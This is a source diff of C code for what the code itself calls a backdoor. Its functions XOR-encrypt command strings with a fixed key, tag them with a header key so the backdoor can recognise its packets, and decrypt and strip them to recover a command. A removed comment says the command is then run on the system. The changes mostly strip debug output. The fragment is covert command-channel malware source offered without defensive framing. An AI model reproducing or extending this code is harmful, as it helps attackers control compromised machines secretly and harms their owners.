@@ -29,8 +29,6 @@
 | - encrypt the string
 | - prepend a key to the hash
 |
-| Notes:
-| - Pass hash_length to be filled with the encrypted message length
 | ------------------------------------------------------------------------------
 */
 
@@ -60,8 +58,7 @@ char *bd_encrypt(char *plaintext, int *msg_length){
     
     /* Encrypt */
     
-    printf("hash len: %zu",strlen(hash));
-    xor_encrypt(hash, BD_ENCRYPT_KEY, strlen(hash));
+    xor_encrypt(hash, BD_ENCRYPT_KEY, hash_len);
     
     /* Prepend header key */
     
@@ -70,7 +67,7 @@ char *bd_encrypt(char *plaintext, int *msg_length){
     strcpy(msg, BD_KEY);
     memcpy(msg + BD_KEY_LEN, hash, hash_len);
     
-    printf("Message: %s\n", msg);
+    //printf("Message: %s\n", msg);
     
     return msg; // Free this pointer after use
 }
@@ -84,14 +81,10 @@ char *bd_encrypt(char *plaintext, int *msg_length){
 | - decrypt the hash
 | - remove header and footer
 | 
-| Notes:
-| - We must pass in the length of the payload because strlen doesnt suffice for
-|   raw bit data.
 | ------------------------------------------------------------------------------
 */
 
 char *bd_decrypt(char *payload, int payload_len){
-    printf("Decrypt payload: %s\n",payload);
     
     /* Check the packet for the key meant for the backdoor */
     
@@ -108,11 +101,10 @@ char *bd_decrypt(char *payload, int payload_len){
     char message[BD_MAX_REPLY_LEN];
     memset(message, 0, BD_MAX_REPLY_LEN);
     memcpy(message, payload + BD_KEY_LEN, message_len);
-    printf("Message: %s\n", message);
+    //printf("Message: %s\n", message);
     
     /* Decrypt message */
     
-    printf("message actual len: %d\n", message_len);
     xor_encrypt(message, BD_ENCRYPT_KEY, message_len);
     
     /* Verify decryption succeeds by checking for header and footer */
@@ -128,7 +120,7 @@ char *bd_decrypt(char *payload, int payload_len){
     else
         printf("Decryption success: %s\n", message);
     
-    /* All checks successful, run the system command */
+    /* All checks successful */
     
     // Strip header and footer to get command
     char *bd_command = malloc(BD_MAX_REPLY_LEN);
